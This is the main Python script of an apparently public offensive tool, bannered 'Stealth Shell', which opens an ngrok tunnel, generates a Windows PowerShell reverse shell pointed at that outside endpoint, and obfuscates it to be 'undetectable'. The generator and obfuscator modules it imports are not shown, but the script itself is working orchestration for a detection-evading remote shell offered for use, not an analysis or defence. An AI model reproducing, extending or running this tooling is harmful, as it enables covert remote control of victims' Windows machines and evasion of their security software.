# Banner

banner = """

  _________  __                   .__     __   .__            _________.__             .__   .__   

 /   _____/_/  |_   ____  _____   |  |  _/  |_ |  |__        /   _____/|  |__    ____  |  |  |  |  

 \_____  \ \   __\_/ __ \ \__  \  |  |  \   __\|  |  \       \_____  \ |  |  \ _/ __ \ |  |  |  |  

 /        \ |  |  \  ___/  / __ \_|  |__ |  |  |   Y  \      /        \|   Y  \\  ___/ |  |__|  |__

/_______  / |__|   \___  >(____  /|____/ |__|  |___|  /     /_______  /|___|  / \___  >|____/|____/

        \/             \/      \/                   \/              \/      \/      \/       

                                                                              

                                                                                  By @RED TEAM 444

"""



print(banner)



import argparse

import time

from generator import generate_reverse_shell

from obfuscator import obfuscate_script

from ngrok_manager import start_ngrok



def main():

    print("Starting main function...")  # Debug print

    parser = argparse.ArgumentParser(description="Generate an undetectable Windows reverse shell PowerShell script.")

    parser.add_argument("-p", "--port", required=True, type=int, help="Port for the reverse shell connection")



    args = parser.parse_args()



    # Start ngrok tunnel and get the tunnel URL

    try:

        print("Starting ngrok...")  # Debug print

        tunnel_url, ngrok_process = start_ngrok(args.port)

    except RuntimeError as e:

        print("RuntimeError:", e)  # Debug print

        return



    # Extract the ngrok host and port

    print("Extracting ngrok host and port...")  # Debug print

    host, port = tunnel_url.replace("tcp://", "").split(":")



    # Generate PowerShell reverse shell script

    print("Generating reverse shell script...")  # Debug print

    shell_code = generate_reverse_shell(host, int(port))



    # Obfuscate the PowerShell script

    print("Obfuscating the PowerShell script...")  # Debug print

    obfuscated_code = obfuscate_script(shell_code)



    # Print the generated and obfuscated PowerShell scripts

    print("Generated PowerShell script:\n", shell_code)

    print("\nObfuscated PowerShell script:\n", obfuscated_code)

    print("\nngrok tunnel URL:", tunnel_url)



    try:

        while True:

            time.sleep(1)

    except KeyboardInterrupt:

        print("Terminating ngrok process...")  # Debug print

        ngrok_process.terminate()



if __name__ == "__main__":

    main()

